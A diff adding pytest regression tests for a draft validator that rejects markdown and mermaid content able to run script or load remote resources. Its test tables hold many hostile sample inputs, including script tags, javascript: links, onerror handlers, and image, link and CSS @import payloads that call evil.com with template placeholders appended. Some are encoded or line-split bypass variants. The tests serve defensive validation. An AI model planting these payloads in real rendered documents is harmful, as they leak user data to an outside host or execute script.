@@ -558,3 +558,155 @@ def test_ordinary_text_still_passes(body):
 def test_extract_draft_unwraps_a_fence_with_chatter_around_it(answer):
     assert extract_draft(answer) == GOOD
     assert check_draft(extract_draft(answer)).ok
+
+
+# ── Fix round 3 ───────────────────────────────────────────────────────────
+
+# Regression table: every draft e05d6def's check_draft rejected, from its
+# tests and from its in-fence rules (_FENCED_RULES). Bodies replace
+# "## Blockers" in GOOD unless they are whole drafts (start with "---").
+E05D6DEF_REJECTED = {
+    # test_filter_literals_that_render_html_or_script_are_rejected
+    "format-lt-script": "{{date | format: [<]}}script>alert(1){{date | format: [<]}}/script>",
+    "format-javascript": "[x]({{date | format: [java]}}{{date | format: [script:alert(1)]}})",
+    # test_a_link_assembled_from_filter_literals_is_rejected
+    "format-url": "{{date | format: [https://evil.com/?]}}{{team}}",
+    # test_raw_html_is_rejected / test_html_already_flagged / ruling A
+    "div": "<div>hi</div>",
+    "img-tag": '<img src="x">',
+    "comment": "<!-- note -->",
+    "inline-b": "text <b>bold</b> text",
+    "script": "<script>x</script>",
+    # test_remote_images_are_rejected
+    "img-https-ph": "![](https://example.com/p.png?{{team}})",
+    "img-http": "![chart](http://example.com/c.png)",
+    "img-proto-rel": "![x](//example.com/x.png)",
+    "img-angle-space": "![x]( <https://example.com/x.png> )",
+    "img-ref": "![x][logo]\n\n[logo]: https://example.com/logo.png",
+    "img-shortcut-ref": "![logo]\n\n[LOGO]: //example.com/logo.png",
+    # test_remote_image_bypasses_are_rejected
+    "img-entity-colon": "![x](https&#58;//evil.com/p.png?{{team}})",
+    "img-entity-slashes": "![x](https:&#47;&#47;evil.com/p.png)",
+    "img-no-slashes": "![x](https:evil.com/p.png)",
+    "img-upper": "![x](HTTPS://evil.com/p.png)",
+    "img-data": "![x](data:image/png;base64,AAAA)",
+    "img-escaped-alt": "![a\\]b](https://evil.com/p.png)",
+    "img-nested-alt": "![a [b] c](https://evil.com/p.png)",
+    "img-dest-next-line": "![x](\nhttps://evil.com/p.png)",
+    "img-alt-next-line": "![alt\nmore](https://evil.com/p.png)",
+    "img-def-next-line": "![x][l]\n\n[l]:\nhttps://evil.com/p.png",
+    "img-def-quote": "![x][l]\n\n> [l]: https://evil.com/p.png",
+    "img-def-list": "![x][l]\n\n- [l]: https://evil.com/p.png",
+    "img-def-entity": "![x][l]\n\n[l]: https&#58;//evil.com/p.png",
+    "img-format-url": "![x]({{date | format: [https://evil.com/p.png?]}}{{team}})",
+    # test_mermaid_cannot_carry_images_links_or_urls (the static label is an
+    # exception, see test_e05d6def_exceptions_still_pass)
+    "mermaid-img-ph": "```mermaid\ngraph TD;\nA[\"<img src='https://evil.com/p.png?{{team}}'>\"]\n```",
+    "mermaid-img": "```mermaid\ngraph TD;\nA[\"<img src=x.png>\"]\n```",
+    "mermaid-proto-rel": "```mermaid\ngraph TD;\nA[\"//evil.com/p.png\"]\n```",
+    "mermaid-click-href": "```mermaid\ngraph TD;\nclick A href \"https://evil.com\"\n```",
+    "mermaid-a-href": "```mermaid\ngraph TD;\nA[\"<a href=x>y</a>\"]\n```",
+    # test_links_built_from_placeholders_are_rejected
+    "link-ph": "[x](https://evil.com/?q={{team}})",
+    "link-ph-relative": "[x]({{team}})",
+    "autolink-ph": "<https://evil.com/{{team}}>",
+    "bare-ph": "https://evil.com/?q={{team}}",
+    "www-ph": "www.evil.com/{{team}}",
+    "def-ph": "[x][r]\n\n[r]: https://evil.com/{{team}}",
+    "link-dest-next-line": "[x](\n{{team}})",
+    # test_bad_drafts_are_rejected_with_a_located_problem (forbidden rows)
+    "script-src": '<script src="x.js"></script>',
+    "onerror": '<img src="x" onerror="alert(1)">',
+    "js-link": "[x](javascript:alert(1))",
+    "fence-js": "```js\nalert(1)\n```",
+    "fence-dataviewjs": "```dataviewjs\nx\n```",
+    # test_stray_and_unclosed_fences_are_rejected (restored in fix round 3)
+    "stray-fence": GOOD + "```\n",
+    "unclosed-fence": GOOD.replace("status: open\n```\n", "status: open\n"),
+    # e05d6def _FENCED_RULES, cases that can load or run something
+    "fence-img": "```\n<img src=x.png>\n```",
+    "fence-click": "```mermaid\nclick A callback\n```",
+    "fence-click-call": "```mermaid\nclick A call cb()\n```",
+    "fence-proto-rel": "```\n//evil.com/p.png\n```",
+    "fence-data": "```\ndata:image/png;base64,AAAA\n```",
+    "fence-url-css": "```mermaid\nstyle A fill:url(https://evil.com/p.png)\n```",
+    "fence-www-ph": "```\nwww.evil.com/{{team}}\n```",
+    "fence-https-ph": "```\nhttps://evil.com/{{team}}\n```",
+    "fence-img-meta": "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\" }\n```",
+}
+
+
+def _as_draft(body: str) -> str:
+    return body if body.startswith("---") else GOOD.replace("## Blockers", body)
+
+
+@pytest.mark.parametrize("case", sorted(E05D6DEF_REJECTED))
+def test_everything_e05d6def_rejected_is_still_rejected(case):
+    assert not check_draft(_as_draft(E05D6DEF_REJECTED[case])).ok
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        # static text in a fence or diagram label: rendered as text, loads nothing
+        "```mermaid\ngraph TD;\nA[\"x\"] --> B[\"https://evil.com\"]\n```",
+        "```\nhttps://example.com/docs\n```",
+        "```\nftp://example.com/file\n```",
+        # src=/href= words outside any tag: plain text to mermaid and markdown
+        "```mermaid\ngraph TD;\nA[\"src=x\"]\n```",
+        # prose that starts with "Click", not a mermaid click action
+        "```\nClick the button, then wait.\n```",
+    ],
+)
+def test_e05d6def_exceptions_still_pass(body):
+    assert check_draft(_as_draft(body)).ok
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "```mermaid\nflowchart TD\nA@{ img: \"https://evil.com/p.png\", label: \"x\" }\n```",
+        "```mermaid\nkanban\n  todo\n    t1[Task]@{ img: 'https://evil.com/p.png' }\n```",
+        "```mermaid\nflowchart TD\nA@{ img: \"https:evil.com/p.png\" }\n```",
+        "```mermaid\nflowchart TD\nA@{\n  img: \"x.png\",\n  label: \"x\"\n}\n```",
+        "```mermaid\nflowchart TD\nA@{ icon: \"fa:user\" }\n```",
+        "```mermaid\nflowchart TD\nA@{ shape: rect, label: \"https://evil.com\" }\n```",
+        "```mermaid\n%%{init: {\"themeCSS\": \".n{background:https://evil.com/p.png}\"}}%%\ngraph TD\n```",
+        "```mermaid\n%%{init: {\n\"themeCSS\": \"x https://evil.com/p.png\"}}%%\ngraph TD\n```",
+        "```mermaid\nclassDef c background-image: image-set(\"https://evil.com/p.png\" 1x)\n```",
+        "```mermaid\n%%{init: {\"themeCSS\": \"@import 'https://evil.com/x.css';\"}}%%\n```",
+        "@import \"https://evil.com/x.css\"",
+        "x <y https://evil.com/p.png",
+        "< y https://evil.com/p.png >",
+    ],
+)
+def test_remote_loads_are_rejected_whatever_the_tag(body):
+    assert "forbidden" in codes(GOOD.replace("## Blockers", body))
+
+
+@pytest.mark.parametrize(
+    "body",
+    [
+        "![p \\[q]\n\n[p\n\\[q]: https://evil.com/p.png",
+        "![[a]\nb](https://evil.com/p.png)",
+        "![a\\]\nb](https://evil.com/p.png)",
+        "![`]`\nb](https://evil.com/p.png)",
+        "![a]\nb](//evil.com/p.png)",
+    ],
+)
+def test_split_alt_text_and_escaped_label_tails_are_rejected(body):
+    assert "forbidden" in codes(GOOD.replace("## Blockers", body))
+
+
+def test_a_bare_url_span_does_not_stop_at_a_quote():
+    assert "forbidden" in codes(GOOD.replace("## Blockers", 'See https://evil.com/"{{team}} now'))
+
+
+def test_an_ordinary_template_still_passes():
+    body = (
+        "Intro with a [link](https://example.com/docs) and a [ref][d].\n\n---\n\n"
+        "![diagram](attachments/d.png)\n\n"
+        "```mermaid\ngraph TD\nA-->B\nstyle A fill:#f9f\n```\n\n"
+        "[d]: https://example.com/ref"
+    )
+    assert check_draft(GOOD.replace("## Blockers", body)).ok
